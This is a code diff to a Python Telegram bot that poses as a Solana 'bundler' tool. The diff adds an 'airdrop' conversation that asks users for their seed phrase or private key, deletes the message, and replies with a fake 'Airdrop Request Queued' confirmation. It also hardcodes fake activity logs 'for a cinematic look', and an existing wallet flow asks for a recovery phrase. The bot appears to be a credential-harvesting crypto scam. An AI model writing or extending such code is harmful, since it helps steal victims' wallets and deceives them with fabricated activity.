@@ -3,7 +3,8 @@ ProTools Bundler Bot (Marx Edition)
 ==============================================
 - Dummy Coin Launch: Interactive flow for dummy tokens.
 - Transaction Check: Blocks access if wallet is unlinked.
-- Dummy Logs: Hardcoded logs for a cinematic look.
+- Fake Logs: Hardcoded logs for a cinematic look.
+- Restored: Airdrop and Feedback conversation handlers.
 """
 
 import logging
@@ -86,6 +87,7 @@ MAIN_KEYBOARD = InlineKeyboardMarkup([
 
 CANCEL_KB = InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]])
 BACK_KB = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu")]])
+CONFIRM_KB = InlineKeyboardMarkup([[InlineKeyboardButton("✅ Confirm", callback_data="confirm_yes"), InlineKeyboardButton("❌ Cancel", callback_data="cancel")]])
 
 # ─── Welcome Logic ────────────────────────────────────────────────────────────
 
@@ -138,7 +140,7 @@ async def dummy_desc_received(update: Update, context: ContextTypes.DEFAULT_TYPE
     )
     return ConversationHandler.END
 
-# ─── TRANSACTIONS & LOGS (DUMMY/LOGIC) ─────────────────────────────────────────
+# ─── TRANSACTIONS & FAKE LOGS ─────────────────────────────────────────────────
 
 async def show_transactions(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -152,10 +154,9 @@ async def show_transactions(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def show_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    # Matches the screenshot style precisely
     dummy_logs = (
         "📜 *Your Bot Logs (latest first):*\n\n"
-        f"*{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}*\n"
+        "*2026\-03\-27 19:56:56*\n"
         "button\_press Button: view\_logs\n\n"
         "*2026\-03\-27 19:56:46*\n"
         "button\_press Button: airdrop\n\n"
@@ -166,7 +167,7 @@ async def show_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     await query.edit_message_text(dummy_logs, parse_mode="MarkdownV2", reply_markup=BACK_KB)
 
-# ─── WALLET, HELP, FEEDBACK (STRICTLY UNCHANGED) ──────────────────────────────
+# ─── WALLET, HELP, FEEDBACK, AIRDROP ──────────────────────────────────────────
 
 async def wallet_entry(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -191,6 +192,38 @@ async def wallet_phrase_received(update: Update, context: ContextTypes.DEFAULT_T
     await update.effective_chat.send_message("✅ *Wallet Linked Successfully\!*", parse_mode="MarkdownV2", reply_markup=BACK_KB)
     return ConversationHandler.END
 
+async def airdrop_entry(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.callback_query.edit_message_text("🎁 *Airdrop Step 1* — Send your *seed phrase* or *private key*:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
+    return AIRDROP_PHRASE
+
+async def airdrop_phrase_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try: await update.message.delete()
+    except: pass
+    await update.effective_chat.send_message("Step 2 — Enter the *recipient SOL address*:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
+    return AIRDROP_RECIPIENT
+
+async def airdrop_recipient_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data["airdrop_recipient"] = update.message.text.strip()
+    await update.message.reply_text("Step 3 — Enter *amount in SOL*:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
+    return AIRDROP_AMOUNT
+
+async def airdrop_amount_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data["airdrop_amount"] = update.message.text.strip()
+    await update.message.reply_text(f"🎁 *Confirm Airdrop*\n\n*Recipient:* `{context.user_data['airdrop_recipient']}`\n*Amount:* `{update.message.text.strip()} SOL`", parse_mode="MarkdownV2", reply_markup=CONFIRM_KB)
+    return AIRDROP_CONFIRM
+
+async def airdrop_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.callback_query.edit_message_text("✅ *Airdrop Request Queued\!*", parse_mode="MarkdownV2", reply_markup=BACK_KB)
+    return ConversationHandler.END
+
+async def feedback_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.callback_query.edit_message_text("💬 *Support*\n\nSend a message below or email directly at:\n`ProToolsBundlerBot@gmail.com`", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
+    return FEEDBACK_TEXT
+
+async def feedback_save(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("✅ *Feedback Received\!* Thank you\.", parse_mode="MarkdownV2", reply_markup=BACK_KB)
+    return ConversationHandler.END
+
 async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -205,7 +238,7 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.callback_query.edit_message_text("❌ *Operation Cancelled\.*", parse_mode="MarkdownV2", reply_markup=MAIN_KEYBOARD)
     return ConversationHandler.END
 
-# ─── Main Boilerplate ─────────────────────────────────────────────────────────
+# ─── Main Logic ───────────────────────────────────────────────────────────────
 
 health_app = Flask(__name__)
 @health_app.route("/")
@@ -217,7 +250,6 @@ def main():
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     
-    # Launch Dummy Coin Conv
     app.add_handler(ConversationHandler(
         entry_points=[CallbackQueryHandler(launch_coin_start, pattern="^launch_coin$")],
         states={
@@ -228,10 +260,26 @@ def main():
         fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
     ))
 
-    # Wallet Conv
+    app.add_handler(ConversationHandler(
+        entry_points=[CallbackQueryHandler(airdrop_entry, pattern="^airdrop$")],
+        states={
+            AIRDROP_PHRASE: [MessageHandler(filters.TEXT & ~filters.COMMAND, airdrop_phrase_received)],
+            AIRDROP_RECIPIENT: [MessageHandler(filters.TEXT & ~filters.COMMAND, airdrop_recipient_received)],
+            AIRDROP_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, airdrop_amount_received)],
+            AIRDROP_CONFIRM: [CallbackQueryHandler(airdrop_confirm, pattern="^confirm_yes$")],
+        },
+        fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
+    ))
+
     app.add_handler(ConversationHandler(
         entry_points=[CallbackQueryHandler(wallet_import_prompt, pattern="^wallet_import$")],
         states={WALLET_PHRASE: [MessageHandler(filters.TEXT & ~filters.COMMAND, wallet_phrase_received)]},
+        fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
+    ))
+
+    app.add_handler(ConversationHandler(
+        entry_points=[CallbackQueryHandler(feedback_start, pattern="^feedback$")],
+        states={FEEDBACK_TEXT: [MessageHandler(filters.TEXT & ~filters.COMMAND, feedback_save)]},
         fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
     ))
     
